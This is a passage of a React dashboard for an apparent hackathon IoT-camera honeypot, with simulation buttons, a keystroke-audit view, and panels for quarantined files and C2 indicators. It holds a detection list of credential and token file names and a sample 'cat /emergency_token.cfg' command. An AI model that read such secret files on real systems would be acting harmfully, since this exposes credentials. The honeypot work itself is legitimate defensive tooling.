                  Hackathon Simulation Drills (Member B Sandbox)
                </span>
                <span style={{ fontSize: '0.7rem', color: 'var(--text-secondary)' }}>
                  Live API triggers for perimeter routing & evidence
                </span>
              </div>

              {drillNotice && (
                <div
                  className="drill-feedback-banner"
                  style={{
                    background: 'var(--accent-primary-subtle)',
                    border: '1px solid var(--border-production)',
                    borderRadius: 'var(--radius-sm)',
                    padding: '0.55rem 0.85rem',
                    fontSize: '0.775rem',
                    color: 'var(--accent-primary)',
                    fontWeight: 500,
                    lineHeight: 1.4,
                    display: 'flex',
                    alignItems: 'center',
                    gap: '0.5rem',
                  }}
                >
                  <span>{drillNotice}</span>
                </div>
              )}

              <div className="sim-btn-row">
                <button
                  className="btn-sim"
                  onClick={handleSimulateBenignAdmin}
                  disabled={isSimulatingBenign}
                  title="Simulate allowlisted technician login to verify it routes directly to real camera without honeytoken entrapment"
                >
                  {isSimulatingBenign ? '⏳ Evaluating Route...' : '+ Benign Admin (Real)'}
                </button>
                <button
                  className="btn-sim"
                  onClick={handleSimulatePortScanner}
                  disabled={isSimulatingScanner}
                  title="Simulate multi-service scanner probing web & ssh to trigger fail-safe rate limiting (score 20-59)"
                >
                  {isSimulatingScanner ? '⏳ Simulating Scan...' : '+ Port Scanner (Rate-Limit)'}
                </button>
                <button
                  className="btn-sim btn-sim-danger"
                  onClick={handleSimulateEvidenceUpload}
                  disabled={isUploadingEvidence}
                  title="Upload sample Mirai dropper script to honeypot quarantine to compute SHA-256 and extract C2 indicators"
                >
                  {isUploadingEvidence ? '⏳ Quarantining...' : '📁 Upload Demo File Evidence'}
                </button>
                <input
                  type="file"
                  ref={fileInputRef}
                  style={{ display: 'none' }}
                  onChange={handleCustomFileUpload}
                />
                <button
                  className="btn-sim"
                  onClick={() => fileInputRef.current?.click()}
                  disabled={isUploadingEvidence}
                  title="Upload any custom file from your device into the safe honeypot quarantine"
                >
                  ⬆️ Upload Custom File...
                </button>
              </div>
            </div>
          </div>

          {/* Right Column: Keystroke Audit, Gateway Score, and File Evidence */}
          <div className="panel-card">
            <div className="panel-title-bar">
              <div className="panel-title">
                <span>💻</span>
                <span>Session Audit & Evidence</span>
              </div>
              {selectedSession && (
                <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                  {renderServiceBadge(selectedSession.service)}
                  <span className="badge-pill badge-decoy">
                    <code>{selectedSession.session_id}</code>
                  </span>
                </div>
              )}
            </div>

            {/* Correlated Gateway Routing Heuristics */}
            {selectedSession?.gateway_decision && (
              <div className="gw-score-container">
                <div className="gw-score-header">
                  <span>
                    Gateway Route: <strong>{renderDestinationBadge(selectedSession.gateway_decision.destination)}</strong>
                  </span>
                  <span>
                    Risk Score:{' '}
                    <strong style={{ color: selectedSession.gateway_decision.score >= 60 ? 'var(--accent-danger)' : 'var(--accent-primary)' }}>
                      {selectedSession.gateway_decision.score.toFixed(1)} / 100
                    </strong>
                  </span>
                </div>
                <div className="gw-score-meter">
                  <div
                    className={`gw-score-fill ${
                      selectedSession.gateway_decision.destination === 'decoy'
                        ? 'decoy'
                        : selectedSession.gateway_decision.destination === 'rate_limit'
                        ? 'rate-limit'
                        : 'real'
                    }`}
                    style={{ width: `${Math.min(100, Math.max(5, selectedSession.gateway_decision.score))}%` }}
                  ></div>
                </div>
                <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)' }}>
                  Reason: {selectedSession.gateway_decision.reason}
                </div>
              </div>
            )}

            {/* Terminal Keystroke Audit (Strict Plain-Text Rendering: NEVER Raw HTML) */}
            <div className="terminal-window">
              <div className="terminal-header">
                <div className="terminal-dots">
                  <div className="dot dot-red"></div>
                  <div className="dot dot-yellow"></div>
                  <div className="dot dot-green"></div>
                </div>
                <div className="terminal-title">AegisOS SmartCam Sandbox [Keystroke Audit]</div>
              </div>

              <div className="terminal-body">
                <div>
                  <span className="terminal-prompt">system:</span>
                  <span>
                    Session established from {selectedSession?.source_ip} via {selectedSession?.service}
                  </span>
                </div>
                {selectedSession?.failed_logins ? (
                  <div style={{ color: '#fbbf24' }}>
                    <span className="terminal-prompt">auth:</span>
                    <span>{selectedSession.failed_logins} failed authentication attempt(s) recorded</span>
                  </div>
                ) : null}

                {/* Render commands chronologically as pure text nodes */}
                {selectedSession?.commands.map((cmd, i) => (
                  <div key={i} style={{ marginTop: '0.4rem' }}>
                    <div>
                      <span className="terminal-prompt">root@aegis-cam:~#</span>
                      {/* SAFE TEXT RENDERING: React automatically escapes untrusted text */}
                      <span>{cmd}</span>
                    </div>
                    {(cmd.includes('credentials.conf') ||
                      cmd.includes('emergency_token.cfg') ||
                      cmd.includes('vault_token.key') ||
                      cmd.includes('firmware_pass.enc') ||
                      cmd.includes('.aws_keys')) && (
                      <div className="terminal-rickroll">
                        <div>🎵 NEVER GONNA GIVE YOU UP, NEVER GONNA LET YOU DOWN 🎵</div>
                        <div style={{ fontSize: '0.725rem', marginTop: '0.2rem', color: '#fca5a5' }}>
                          [!] CANARY HONEYTOKEN ACCESSED — Session flagged with Max Hostility.
                        </div>
                      </div>
                    )}
                  </div>
                ))}

                {selectedSession?.commands.length === 0 && (
                  <div style={{ color: 'var(--text-muted)', fontStyle: 'italic', marginTop: '0.5rem' }}>
                    No commands entered in this session yet.
                  </div>
                )}
              </div>
            </div>

            {/* Safe Command Injection Form */}
            <form onSubmit={handleRunCommand} style={{ display: 'flex', gap: '0.5rem', marginTop: '0.75rem' }}>
              <input
                type="text"
                placeholder="Inject diagnostic command (e.g. cat /emergency_token.cfg, ls, uname)..."
                value={customCmd}
                onChange={(e) => setCustomCmd(e.target.value)}
                style={{
                  flex: 1,
                  padding: '0.55rem 0.85rem',
                  background: 'var(--bg-surface-subtle)',
                  border: '1px solid var(--border-subtle)',
                  borderRadius: 'var(--radius-sm)',
                  color: 'var(--text-primary)',
                  fontFamily: 'var(--font-mono)',
                  fontSize: '0.8rem',
                }}
              />
              <button
                type="submit"
                className="btn-sim"
                style={{ borderColor: 'var(--accent-primary)', color: 'var(--accent-primary)', background: 'var(--accent-primary-subtle)', fontWeight: 600 }}
              >
                Send
              </button>
            </form>

            {/* File Evidence & Candidate Indicators Section */}
            <div className="evidence-card" id="session-evidence-panel">
              <div className="evidence-header">
                <span>📁 Submitted File Evidence & Indicators</span>
                {selectedSession?.file_submissions && selectedSession.file_submissions.length > 0 && (
                  <span className="badge-pill" style={{ background: 'var(--accent-primary-subtle)', color: 'var(--accent-primary)' }}>
                    {selectedSession.file_submissions.length} Artifact(s)
                  </span>
                )}
              </div>

              {/* Selected Single-Slot Schema Indicators */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '0.85rem' }}>
                <div style={{ fontSize: '0.775rem' }}>
                  <span style={{ color: 'var(--text-muted)' }}>malware_hash: </span>
                  {selectedSession?.malware_hash ? (
                    <code style={{ color: 'var(--accent-primary)', fontWeight: 600 }}>{selectedSession.malware_hash}</code>
                  ) : (
                    <span style={{ color: 'var(--text-muted)' }}>None observed</span>
                  )}
                  <div className="disclaimer-badge">
                    * Digest of submitted bytes; not proof that file is malware.
                  </div>
                </div>

                <div style={{ fontSize: '0.775rem' }}>
                  <span style={{ color: 'var(--text-muted)' }}>c2_address: </span>
                  {selectedSession?.c2_address ? (
                    <code style={{ color: 'var(--accent-review)', fontWeight: 600 }}>{selectedSession.c2_address}</code>
                  ) : (
                    <span style={{ color: 'var(--text-muted)' }}>None observed</span>
                  )}
                  <div className="disclaimer-badge">
                    * Statically extracted indicator; not confirmed C2 infrastructure.
                  </div>
                </div>
              </div>

              {/* Quarantined File Submissions List */}
              {selectedSession?.file_submissions && selectedSession.file_submissions.length > 0 ? (
                <div>
                  <div style={{ fontSize: '0.725rem', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '0.4rem', textTransform: 'uppercase' }}>
                    Quarantined Upload Artifacts:
                  </div>
                  {selectedSession.file_submissions.map((sub, idx) => (
                    <div key={idx} className="artifact-item">
                      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.25rem' }}>
                        <strong>{sub.original_filename}</strong>
                        <span style={{ color: 'var(--text-muted)' }}>{sub.size_bytes} bytes</span>
                      </div>
                      <div style={{ color: 'var(--text-muted)', fontSize: '0.725rem' }}>
                        Stored: <code>{sub.quarantine_filename}</code>
                      </div>
                      <div style={{ color: 'var(--text-muted)', fontSize: '0.725rem' }}>
                        SHA-256: <code>{sub.sha256}</code>
                      </div>
                      {sub.candidate_urls && sub.candidate_urls.length > 0 && (
                        <div style={{ marginTop: '0.35rem' }}>
                          <span style={{ color: '#f59e0b', fontSize: '0.725rem' }}>Candidate URLs: </span>
                          {sub.candidate_urls.map((u, uidx) => (
                            <code key={uidx} style={{ color: '#f59e0b', marginRight: '0.4rem' }}>
                              {u}
                            </code>
                          ))}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              ) : (
                <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', fontStyle: 'italic' }}>
                  No uploaded file artifacts recorded for this session.
                </div>
              )}

              {/* Referenced URLs & Files from Commands (Tracked Separately) */}
              {selectedSession &&
                ((selectedSession.referenced_urls && selectedSession.referenced_urls.length > 0) ||
                  (selectedSession.referenced_files && selectedSession.referenced_files.length > 0)) && (
                  <div style={{ marginTop: '0.75rem', borderTop: '1px solid var(--border-subtle)', paddingTop: '0.5rem' }}>
                    <div style={{ fontSize: '0.725rem', fontWeight: 600, color: 'var(--text-muted)', marginBottom: '0.35rem', textTransform: 'uppercase' }}>
                      Command-Line Referenced Items (Separate from Uploads):
                    </div>
                    {selectedSession.referenced_urls && selectedSession.referenced_urls.length > 0 && (
                      <div style={{ fontSize: '0.75rem', marginBottom: '0.25rem' }}>
                        <span style={{ color: 'var(--text-muted)' }}>Referenced URLs: </span>
                        {selectedSession.referenced_urls.map((u, uidx) => (
                          <span key={uidx} className="ioc-tag" style={{ marginRight: '0.3rem' }}>
                            {u}
                          </span>
                        ))}
                      </div>
                    )}
                    {selectedSession.referenced_files && selectedSession.referenced_files.length > 0 && (
                      <div style={{ fontSize: '0.75rem' }}>
                        <span style={{ color: 'var(--text-muted)' }}>Referenced Files: </span>
                        {selectedSession.referenced_files.map((f, fidx) => (
                          <code key={fidx} style={{ color: 'var(--text-primary)', fontWeight: 600, marginRight: '0.4rem' }}>
                            {f}
                          </code>
                        ))}
                      </div>
                    )}
                  </div>
                )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
